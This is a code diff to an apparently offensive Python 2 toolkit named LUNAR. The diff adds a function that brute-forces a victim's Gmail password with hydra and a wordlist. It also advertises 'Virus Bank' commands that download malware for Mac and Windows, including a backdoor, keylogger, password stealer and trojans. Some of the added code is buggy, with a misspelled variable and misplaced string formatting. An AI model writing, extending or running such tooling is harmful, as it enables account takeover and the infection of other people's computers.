@@ -23,11 +23,9 @@ import random
 import requests
 import urllib2
 import hashlib
+import datetime
 import time as t
 import subprocess
-import selenium
-from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
 from colorama import init, Fore
 from cryptography.fernet import Fernet
 from fake_useragent import UserAgent
@@ -79,7 +77,6 @@ logo1 =  color.BLUE + '''
 # Vars
 x = os.path.dirname(os.path.realpath(__file__))
 history = []
-done = False
 logo_list = [logo1, logo2 ]
 termsAndConditions = color.BLUE + ''' Don`t Use LUNAR To:
 create and share malicious viruses, illegally harm others computers,
@@ -89,7 +86,7 @@ and violate privacy
 '''
 
 help_mesg = '''
-{0}[+] {1}Default commands {2}(7)
+{0}[+] {1}Default commands {2}(7)--
 {0} └──> {1}clear       : Clears Screen
 {0} └──> {1}exit        : Exits
 {0} └──> {1}help        : Shows help screen
@@ -110,7 +107,7 @@ help_mesg = '''
 {0} └──> {1}hash_sha1   : Encodes word(s) to hash (SHA1)
 {0} └──> {1}hash_sha384 : Encodes word(s) to hash (SHA384)
 
-{0}[+] {1}Virus Bank Mac {2} (10)
+{0}[+] {1}Virus Bank Mac {2} (10) --> Pass Infected <--
 {0} └──> {1} mac_backdoor: Downloads a mac backdoor virus
 {0} └──> {1} mac_keylog  : Downloads a mac key logger
 {0} └──> {1} mac_adware  : Downloads a mac adware virus
@@ -122,7 +119,7 @@ help_mesg = '''
 {0} └──> {1} mac_pass    : Downloads a mac password stealer
 
 
-{0}[+] {1}Virus Bank Windows {2} (10)
+{0}[+] {1}Virus Bank Windows {2} (6) --> Pass Infected <--
 {0} └──> {1} win_fflash  : Downloads a fake flash player malware
 {0} └──> {1} win_bonzi   : Downloads Bonzi Buddy
 {0} └──> {1} win_memz    : Downloads the MEMZ virus
@@ -157,6 +154,7 @@ help_mesg = '''
 {0} └──> {1} site2ip     : Find ip address from website
 {0} └──> {1} headers     : Show headers of a website
 {0} └──> {1} admin       : Find admin pannel of website
+{0} └──> {1} hydra       : Hydra email brute force
 
 '''.format(color.BLUE, color.CWHITE, color.GREEN, color.YELLOW).decode('utf')
 
@@ -251,6 +249,15 @@ def platform_check():
         platform_check()
         
 # Modules #
+
+def hydra_brute():
+    try:
+        victum = raw_input(color.GREEN +'[+] '+color.CWHITE + 'Enter a email to brute force: ')
+        wordlist = raw_input(color.GREEN +'[+] '+color.CWHITE + 'Enter a wordlist file ')
+        os.system('hydra smtp.gmail.com smtp -l {0} -P {1} -s 465 -S -v -V').format(victum, wordlsit)
+    except KeyboardInterrupt:
+        main()
+
 
 def admin():
     links = open(x+'\Resources\links.txt')
@@ -855,7 +862,7 @@ def main():
     while True:
         global history
         try:
-            option_framework = raw_input(color.CWHITE + 'LUNAR$ '+color.BLUE)
+            option_framework = raw_input(color.CWHITE + '[home][LUNAR] > '+color.CWHITE)
             history.append(option_framework)
             if option_framework.lower()  == '/':
                 last_command = len(history)
@@ -934,7 +941,7 @@ def main():
             if option_framework.lower() == 'cupp':
                 os.system('git clone https://github.com/Mebus/cupp')
             if option_framework.lower() =='hydra':
-                os.system(' https://github.com/vanhauser-thc/thc-hydra')
+                os.system('https://github.com/vanhauser-thc/thc-hydra')
             if option_framework.lower() == 'https://github.com/derv82/wifite':
                 os.system('git clone https://github.com/derv82/wifite')
             if option_framework.lower() =='instabrute':
@@ -1008,6 +1015,11 @@ def main():
                 print tools
             if option_framework.lower() == 'exit':
                     ErrorLog('Exiting\n')
+                    log_file  = open(x+'\log.txt','a+')
+                    global start_time
+                    end_time = datetime.datetime.now()
+                    time = '\n'+ str(start_time.hour) + ':' + str(start_time.minute) + ' => ' + str(end_time.hour) + ':' + str(end_time.minute)
+                    log_file.write(time)
                     exit()
             if option_framework.lower() == 'mac_backdoor':
                 mac_backdoor()
@@ -1038,11 +1050,14 @@ def main():
             if option_framework.lower() == 'win_exploit':
                 win_exploitkit() 
             if option_framework.lower() == 'win_trojan':
-                win_trojan()           
+                win_trojan()
+            if option_framework.lower() == 'hydra':
+                hydra_brute()           
         except KeyboardInterrupt:
             ErrorLog('Exit using the command "exit"')
 
 
 
 # Run
+start_time = datetime.datetime.now()
 platform_check()
